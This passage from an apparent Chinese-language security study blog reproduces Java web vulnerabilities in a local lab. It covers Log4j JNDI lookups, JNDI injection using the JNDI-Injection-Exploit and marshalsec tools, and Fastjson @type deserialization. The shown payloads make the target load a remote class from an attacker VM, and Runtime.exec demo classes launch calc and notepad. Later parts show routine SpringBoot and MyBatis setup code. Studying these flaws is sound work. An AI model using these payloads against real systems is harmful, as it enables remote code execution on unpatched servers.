<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        con.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        con.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>);<br>        con.setDoOutput(<span class="hljs-literal">true</span>);<br>    <br>        <span class="hljs-type">String</span> <span class="hljs-variable">postData</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;code=$&#123;java:os&#125;&quot;</span>;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> con.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] input = postData.getBytes(StandardCharsets.UTF_8);<br>            os.write(input, <span class="hljs-number">0</span>, input.length);<br>        &#125;<br>    <br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> con.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;POST Response Code :: &quot;</span> + responseCode);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<p>所以,此时需要对这些不允许的特殊字符进行url编码，构造出新的url</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjava:os%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjava%3Aos%7D</a></p>
<p>成功执行</p>
<p>​<img src="/assets/image-20240715181732-ajm1k14.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>JNDI注入</p>
<p>利用 JNDI-ldap 执行命令</p>
<p>使用 JNDI 注入工具生成远程可访问的调用方法 (这里用的是 JNDIExploit)</p>
<p>也就是 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
<p>使用命令如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;notepad&quot;</span> -A <span class="hljs-number">192.168</span><span class="hljs-number">.88</span><span class="hljs-number">.142</span><br>                                                        要执行的命令      服务器ip<br></code></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20240715191829-xp7v92p.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>这里根据自己的jdk判断需要使用<code>ldap://192.168.88.142:1389/etrd1z</code>​</p>
<p>使用JNDI注入则为<code>jndi:ldap://192.168.88.142:1389/etrd1z</code>​</p>
<p>code的值就为<code>$&#123;jndi:ldap://192.168.88.142:1389/etrd1z&#125;</code>​</p>
<p>构造url:</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjndi:ldap://192.168.88.142:1389/etrd1z%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=${jndi:ldap://192.168.88.142:1389/etrd1z}</a></p>
<p>经过url编码后得到</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjndi:ldap://192.168.88.142:1389/etrd1z%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjndi%3Aldap%3A%2F%2F192.168.88.142%3A1389%2Fetrd1z%7D</a></p>
<p>最后成功执行！</p>
<p>​<img src="/assets/image-20240715193045-q3x4hn4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>​<img src="/assets/image-20240715194834-vu46q1s.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>Fastjson</p>
<ol>
<li><p>Maven引用Fastjson</p>
<p> <img src="/assets/image-20240715234653-ppk0ehy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240715234701-waz6x5l.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240715234711-u9ny4p5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> User.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-comment">// 给fastjson数据转换测试用的</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>        <br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(age);<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(name);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> FastjsonTest.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br>        <br><span class="hljs-comment">// 使用Fastjson去除了User类数据</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// u Object对象</span><br>        <span class="hljs-comment">// Integer age String name 数据</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        u.setAge(<span class="hljs-number">20</span>);<br>        u.setName(<span class="hljs-string">&quot;SuYou&quot;</span>);<br><span class="hljs-comment">//       System.out.println(u);</span><br>        <br>        <span class="hljs-comment">// 把数据转换为Json格式数据，不想用自带的API（太麻烦）</span><br>        <span class="hljs-comment">// 所以使用Fastjson来进行数据转换</span><br>        <span class="hljs-comment">// 将json对象转化为json数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(u);<br>        System.out.println(<span class="hljs-string">&quot;这就是json格式：&quot;</span>+jsonString);<br>        <br>        <span class="hljs-comment">// 分析漏洞利用 多输出 转换数据类型 其实前面有一个@type转换对象类包</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString1</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(u, SerializerFeature.WriteClassName);<br>        System.out.println(<span class="hljs-string">&quot;这就是json格式：&quot;</span>+jsonString1);<br>        <br>        <span class="hljs-comment">// 上面是   对象 -&gt; JSON</span><br>        <br>        <span class="hljs-comment">// 下面是   JSON -&gt; 对象</span><br>        <span class="hljs-comment">// String test = &quot;&#123;\&quot;@type\&quot;:\&quot;com.suyou.User\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;SuYou\&quot;&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.suyou.Run\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;SuYou\&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 实战中com.suyou.Run 我们不知道 所以一般固定调用java自带的一些包</span><br>        <span class="hljs-comment">// rmi ldap 去触发远程的class 执行代码（RCE）</span><br>        <br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(test);<br>        System.out.println(jsonObject);<br>        <br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> Run.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-keyword">import</span> java.io.IOException;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>运行 FastjsonTest.java，会进行序列化和反序列化过程，会将 User 对象序列化转换为 Json，后面会将 Json 反序列化转换回对象，此时，我们发现在反序列化转换回对象时，可以显示对象包名，我们可以通过修改包名来改变反序列化回的对象。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.xiaodi.User\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.xiaodi.Run\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>

<p> 如上面两个 json，第二个将原本的 User 换为了我们自己写的 Run 对象，而 Run 对象中被我们写入了恶意代码，后续过程将 test 进行了反序列化操作，将 json 反序列化为对象时构造了 Run 对象，执行了其中构造函数的恶意代码，弹出了计算器。</p>
<p> 但是在实战过程中，我们不知道 comsuyoo.RUn ，我们无法确定人家哪个包可以用，所以一般固定调用 java 自带的一些包，很多复现都能看到，然后使用 rmi ldap 去触发远程的 class 执行代码（RCE）<br> Fastjson 漏洞复现：<a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/120532891" title="Fastjson漏洞复现_fastjson 1.2.84-CSDN博客">Fastjson漏洞复现_fastjson 1.2.84-CSDN博客</a></p>
</li>
</ol>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类"><a href="#JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类" class="headerlink" title="JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类"></a>JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类</h3><p><strong>&#x3D;&#x3D;注意！！！你的服务器和主机的jdk版本必须一致，这里使用的是jdk8u112&#x3D;&#x3D;</strong></p>
<ol>
<li><p>JNDI远程调用-JNDI-Injection</p>
<p> 1、使用远程调用(默认端口1389)<br> 调用rmi ldap等服务对象类，远程地址的一个class文件被执行</p>
<p> 示例：</p>
<p> new InitialContext().lookup(“ldap:&#x2F;&#x2F;xx.xx.xx.xx:1389&#x2F;Test”);<br> new InitialContext().lookup(“rmi:&#x2F;&#x2F;xx.xx.xx.xx:1099&#x2F;Test”);</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://192.168.88.142:1099/spaum9&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://192.168.88.142:1389/spaum9&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> 2、使用利用工具生成调用地址<br> 创建一个rmi ldap等服务调用 实例化<br> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A xx.xx.xx.xx</p>
<p> 上面这条命令里的-C意味着执行其class文件</p>
<p> <img src="/assets/image-20240717112421-dfcvygv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717112635-mssiiqp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>JNDI远程调用-marshalsec</p>
<p> 1 、使用远程调用 ( 默认端口 1389 )</p>
<p> 示例：<br> new InitialContext().lookup(“ldap:&#x2F;&#x2F;xx.xx.xx.xx:1389&#x2F;Test”);<br> new InitialContext().lookup(“rmi:&#x2F;&#x2F;xx.xx.xx.xx:1099&#x2F;Test”);</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://192.168.88.142:1099/spaum9&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://192.168.88.142:1389/spaum9&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> 2、创建并编译调用对象</p>
<p> 创建Test.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> 打开终端并进行编译</p>
<p> <img src="/assets/image-20240717113508-lkcc7ma.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717113825-n6wq7cr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 3、将编译后的Class文件存放到攻击机中，这里使用的是虚拟机作为攻击机，也可以使用云服务器（自己搭建）或者在主机使用python2 -m SimpleHTTPServer启动一个小型服务器</p>
<p> <img src="/assets/image-20240717115033-dwgamxr.png" srcset="/img/loading.gif" lazyload alt="image">4、使用工具生成调用协议，并执行代码</p>
<ul>
<li><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.88.142/#Test</code>​</p>
<p><img src="/assets/image-20240717120406-czb4q1b.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.88.142/#Test</code>​<br>​<img src="/assets/image-20240717120750-zjkbym4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>JNDI注入-FastJson漏洞结合</p>
<p> 1、创建对应的FastJson项目</p>
<p> <img src="/assets/image-20240717121151-8net82k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、搭建漏洞环境</p>
<p> <img src="/assets/image-20240717121504-k6euxqx.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717121641-vbk0d97.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717121913-6k56z03.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717122010-iqcdgui.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 3、生成远程调用方法</p>
<p> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A 192.168.88.142</p>
<p> <img src="/assets/image-20240717122230-lzxoxy5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 4、提交JSON数据payload</p>
<p> <code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.88.142:1389/wnnjgr&quot;,&quot;autoCommit&quot;:true&#125;</code>​</p>
<p> <img src="/assets/image-20240717123020-2zwpq6n.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717122834-64swg8j.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-SpringBoot框架-MyBatis注入-Thymeleaf模版"><a href="#JavaEE应用-SpringBoot框架-MyBatis注入-Thymeleaf模版" class="headerlink" title="JavaEE应用&amp;SpringBoot框架&amp;MyBatis注入&amp;Thymeleaf模版"></a>JavaEE应用&amp;SpringBoot框架&amp;MyBatis注入&amp;Thymeleaf模版</h3><ol>
<li><p>SpringBoot框架搭建</p>
<p> 新建项目</p>
<p> 注意切换国内URL，这样导入库比较快</p>
<p> <img src="/assets/image-20240717195055-90ak8ya.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717195137-2y6x1sd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 源码：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodisec.springboottest.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br><br>    <span class="hljs-comment">//指定GET请求的访问路由</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodiget&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodiget&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getindex</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;get test&quot;</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">//指定POST请求的访问路由</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodipost&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-comment">//@PostMapping(&quot;/xiaodipost&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getpost</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;post test&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//指定GET请求的访问路由 带参数名name</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodiget_g&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodiget&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_g</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;get test&quot;</span>+name;<br>    &#125;<br><br>    <span class="hljs-comment">//指定POST请求的访问路由 带参数名name</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodipost_p&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodipost&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_p</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;post test&quot;</span>+name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p> 访问路由，这里只列出这一个，其余同理</p>
<p> ​<img src="/assets/image-20240717195305-bncrqrn.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 如果下方显示<code>IDEA卡在”正在解析Maven依赖项“的解决方法</code>​就按图示步骤查看是否配置正确，使用idea新建项目时，有时候会重置maven的配置，<a target="_blank" rel="noopener" href="https://www.jb51.net/article/259780.htm">配置方法点这里</a></p>
<p> ​<img src="/assets/image-20240717195603-a6gkmf4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>MyBatis注入</p>
<p> 新建项目</p>
<p> <img src="/assets/image-20240717195941-gy4yuuz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 注意，此时添加的依赖项与上面不同，多添加的依赖项会自动修改pom.xml中的内容，不用去<a target="_blank" rel="noopener" href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>上再找mysql和mybatis的驱动去添加</p>
<p> <img src="/assets/image-20240717200032-1xcpwv4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 启动phpstudy的mysql服务</p>
<p> <img src="/assets/image-20240717200207-1oc460g.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 项目配置数据库连接信息，注意这里的application.yml的后缀是经过修改的，原本不是这个后缀</p>
<p> <img src="/assets/image-20240717200710-zussjhw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 创建User类用来操作数据库数据</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.entity;<br><br><span class="hljs-comment">// 代表用户实体的实体类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Integer id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span 